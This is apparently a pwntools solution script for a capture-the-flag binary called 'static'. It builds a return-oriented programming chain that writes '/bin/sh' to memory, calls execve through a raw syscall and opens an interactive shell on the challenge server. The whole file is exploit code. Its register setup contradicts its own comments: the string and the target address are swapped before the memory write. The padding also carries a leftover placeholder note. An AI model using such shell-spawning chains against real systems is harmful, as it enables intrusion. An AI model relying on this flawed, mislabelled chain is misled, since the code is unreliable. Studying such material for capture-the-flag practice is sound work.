from pwn import *
import sys

# Configuration for the connection and binary file
binary_path = './static'
host = 'static.chal.cyberjousting.com'
port = 1350

binary = ELF(binary_path)

context.update(arch='amd64', os='linux')

# Check if we want to run in local, remote, or debug mode
mode = sys.argv[1] if len(sys.argv) > 1 else 'remote'
if mode not in ['local', 'remote', 'debug']:
    print("Usage: script.py [local|remote|debug]")
    sys.exit(1)

# Start a local process for testing, connect to a remote server, or run in debug mode
if mode == 'local':
    p = process(binary_path)
elif mode == 'debug':
    p = gdb.debug(binary_path, gdbscript='''
        b *main
        continue
    ''', terminal=['tmux', 'splitw', '-h'])
else:
    p = remote(host, port)

# Gadgets and addresses
syscall_ret = 0x0000000000401194  # syscall; ret;
pop_rdi = 0x0000000000401fe0  # pop rdi; ret;
pop_rsi = ROP(binary).find_gadget(['pop rsi', 'ret'])[0]
pop_rax = ROP(binary).find_gadget(['pop rax', 'ret'])[0]
pop_rdx = 0x0000000000432972  # pop rdx; ret;
mov_rax_rsi = 0x00000000004116c1  # mov [rax], rsi; ret;

# Writable and executable region (assume a region, e.g., .bss)
writable_executable_addr = binary.bss()
dummy_address = writable_executable_addr + 0x100  # A dummy address for rax

# Build the ROP chain
rop = ROP(binary)

# Move /bin/sh into writable area
rop.raw([pop_rsi, writable_executable_addr])  # rdi = address to .bss segment
rop.raw([pop_rax, u64(b'/bin/sh\x00')])  # rsi = "/bin/sh"
rop.raw(mov_rax_rsi)
rop.raw([pop_rdi, writable_executable_addr])

# Set up registers for execve
rop.raw([pop_rsi, 0])  # rsi = NULL
rop.raw([pop_rdx, 0])  # rdx = NULL
rop.raw([pop_rax, 59])  # rax = 59 (execve)
rop.raw(syscall_ret)  # syscall; ret;

# Print the ROP chain for debugging
print("ROP chain:")
print(rop.dump())

# Create the payload
payload = b'A' * 18  # Replace 'offset' with the correct offset to the return address
payload += rop.chain()

# Print the payload as hexdump for inspection
print("Payload hexdump:")
print(hexdump(payload))

# Send the payload
p.sendline(payload)

# Interact with the process
p.interactive()

# Close the connection
p.close()

